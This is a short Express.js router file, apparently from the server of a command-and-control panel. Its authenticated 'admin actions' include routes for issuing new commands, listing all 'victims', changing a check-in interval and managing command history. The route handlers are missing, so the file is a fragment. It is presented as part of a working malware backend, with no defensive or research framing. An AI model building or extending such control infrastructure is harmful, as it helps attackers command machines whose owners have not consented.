const express = require("express");
const router = express.Router();
const Module = require("../modules/adminModule");
const authMiddleware = require("../middleware/authMiddleware");

router.post("/login", Module.login);
router.post("/register", Module.register);
router.post("/refresh", Module.refresh);

// admin actions

router.post("/newcmd", authMiddleware.verifyJWT);
router.delete("/deleteaccount", authMiddleware.verifyJWT);
router.patch("/updateinterval", authMiddleware.verifyJWT);
router.get("/getallvictims", authMiddleware.verifyJWT);
router.get("/commandhistory", authMiddleware.verifyJWT);
router.delete("/clearcommandhistory", authMiddleware.verifyJWT);

module.exports = router;
